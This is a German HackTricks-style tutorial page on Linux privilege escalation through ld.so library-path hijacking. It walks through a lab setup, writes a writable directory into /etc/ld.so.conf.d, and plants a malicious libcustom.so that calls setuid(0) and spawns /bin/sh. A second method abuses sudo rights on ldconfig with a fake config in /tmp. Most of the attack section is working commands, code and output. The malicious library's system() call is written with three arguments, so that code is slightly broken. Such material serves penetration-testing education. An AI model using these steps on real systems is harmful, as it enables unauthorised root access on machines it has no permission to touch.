# ld.so privesc exploit Beispiel

{{#include ../../banners/hacktricks-training.md}}

## Umgebung vorbereiten

Im folgenden Abschnitt finden Sie den Code der Dateien, die wir verwenden werden, um die Umgebung vorzubereiten

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Erstellen** Sie diese Dateien auf Ihrem Rechner im selben Ordner
2. **Kompilieren** Sie die **Bibliothek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieren** Sie `libcustom.so` nach `/usr/lib`: `sudo cp libcustom.so /usr/lib` (Root-Rechte)
4. **Kompilieren** Sie die **ausführbare Datei**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Überprüfen Sie die Umgebung

Überprüfen Sie, ob _libcustom.so_ von _/usr/lib_ **geladen** wird und ob Sie die Binärdatei **ausführen** können.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

In diesem Szenario nehmen wir an, dass **jemand einen verwundbaren Eintrag** in einer Datei in _/etc/ld.so.conf/_ erstellt hat:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Der anfällige Ordner ist _/home/ubuntu/lib_ (wo wir schreibbaren Zugriff haben).\
**Laden Sie den folgenden Code herunter und kompilieren Sie ihn** in diesem Pfad:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Jetzt, da wir die **bösartige libcustom-Bibliothek im falsch konfigurierten** Pfad erstellt haben, müssen wir auf einen **Neustart** oder darauf warten, dass der Root-Benutzer **`ldconfig`** ausführt (_falls Sie diese Binärdatei als **sudo** ausführen können oder das **suid-Bit** gesetzt ist, können Sie sie selbst ausführen_).

Sobald dies geschehen ist, **überprüfen** Sie erneut, wo das `sharevuln`-Executable die `libcustom.so`-Bibliothek lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie Sie sehen können, wird es **von `/home/ubuntu/lib` geladen** und wenn ein Benutzer es ausführt, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Beachten Sie, dass wir in diesem Beispiel keine Berechtigungen erhöht haben, aber durch das Modifizieren der ausgeführten Befehle und **Warten auf den Root- oder einen anderen privilegierten Benutzer, der die verwundbare Binärdatei ausführt**, werden wir in der Lage sein, die Berechtigungen zu erhöhen.

### Andere Fehlkonfigurationen - Dieselbe Verwundbarkeit

Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator **einen nicht privilegierten Ordner in einer Konfigurationsdatei in `/etc/ld.so.conf.d/` gesetzt hat**.\
Es gibt jedoch andere Fehlkonfigurationen, die dieselbe Verwundbarkeit verursachen können. Wenn Sie **Schreibberechtigungen** in einer **Konfigurationsdatei** innerhalb von `/etc/ld.so.conf.d`, im Ordner `/etc/ld.so.conf.d` oder in der Datei `/etc/ld.so.conf` haben, können Sie dieselbe Verwundbarkeit konfigurieren und ausnutzen.

## Exploit 2

**Angenommen, Sie haben sudo-Berechtigungen für `ldconfig`**.\
Sie können `ldconfig` **angeben, wo die Konfigurationsdateien geladen werden sollen**, sodass wir dies ausnutzen können, um `ldconfig` anzuweisen, beliebige Ordner zu laden.\
Lassen Sie uns also die benötigten Dateien und Ordner erstellen, um "/tmp" zu laden:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Jetzt, wie im **vorherigen Exploit** angegeben, **erstellen Sie die bösartige Bibliothek im Verzeichnis `/tmp`**.\
Und schließlich laden wir den Pfad und überprüfen, wo die Binärdatei die Bibliothek lädt:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, können Sie mit sudo-Rechten über `ldconfig` dieselbe Schwachstelle ausnutzen.**

{{#include ../../banners/hacktricks-training.md}}
